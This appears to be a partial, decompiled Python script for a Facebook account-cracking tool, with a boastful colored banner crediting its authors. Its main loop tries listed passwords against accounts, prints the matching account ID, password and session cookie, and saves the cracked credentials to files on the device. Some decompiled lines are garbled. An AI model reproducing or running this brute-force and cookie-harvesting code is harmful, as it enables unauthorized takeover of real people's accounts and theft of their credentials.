...
def o():
    ...
    if opt == '1':
        i()
    if None == '2':
        os.system('xdg-https://www.facebook.com/DeViL.BoY.NaJmUl')
        return None
    if None == '3':
        os.system('xdg- clear')
        return None
...
\033[1;37m================= \33[32;45﹏𝐃𝐞𝐯𝐢𝐥﹏\33[0;m =====================
\033[1;32m     \033[1;35m ★IF YOU ARE BAD﹏𝐃𝐞𝐯𝐢𝐥﹏IS YOUR DAD ★
\033[1;32m     \033[1;33mCREATED BY\33[0;m   :  \033[1;33ღ﹏𝐃𝐞𝐯𝐢𝐥﹏ღ\33[0;m\033[1;32m && \033[1;33mHASAN\33[0;m
\033[1;32m     \033[1;32mFACEBOK (UID)      : \033[1;34m N41M01
\033[1;32m     \033[1;35mGITHUB       :  \033[1;35mN41M01
\033[1;32m     \033[1;36mTOOL STATUS  :  \033[1;36mTOOL IS FREE
\033[1;32m     \033[1;35mWHAT'S APP         :  \033[1;35mNMBR DIMO NAH
\033[1;32m     \033[1;36mTOOL VIRSION :  \033[1;36m2.4
\033[1;37m================= \33[32;45mMR\33[0;m =====================
 
       \33[37;41m\t WELLCOME TO ღ﹏𝐃𝐞𝐯𝐢𝐥﹏ღ TOOLS\33[0;m
    ...
    try:
        for ps in pwx:
            ...
            if 'c_user' in log_cookies:
                ...
                cid = coki[7:22]
                print('    \033[1;32m(𝐃𝐞𝐯𝐢𝐥﹏OK)  ' +cid+ ' | ' +ps+    '  \n \033[1;33mCookie = \033[1;32m'+coki+  ' \n '+pro+'  \033[0;97m')
                cek_apk(session,coki)
                open('/sdcard/NAJMUL-OK.txt', 'a').write( cid+' | '+ps+'\n')
                oks.append(cid)
                break
            elif 'checkpoint' in log_cookies:
                coki=";".join([key+"="+value for key,value in session.cookies.get_dict().items()])
                cid = coki[24:39]
                print('    \33[1;30m(𝐃𝐞𝐯𝐢𝐥﹏CP)  ' +cid+ ' | ' +ps+           '  \33[0;97m')
                open('/sdcard/NAJMUL-CP.txt', 'a').write( cid+' | '+ps+' \n')
                cps.append(cid)
                break
            else:
                continue
        loop+=1
        sys.stdout.write('\r     %s[NAJMUL] [%s/%s]  OK:- %s  CP:- %s \r'%(H,loop,tl,len(oks),len(cps))),
        sys.stdout.flush()
    except:
        pass
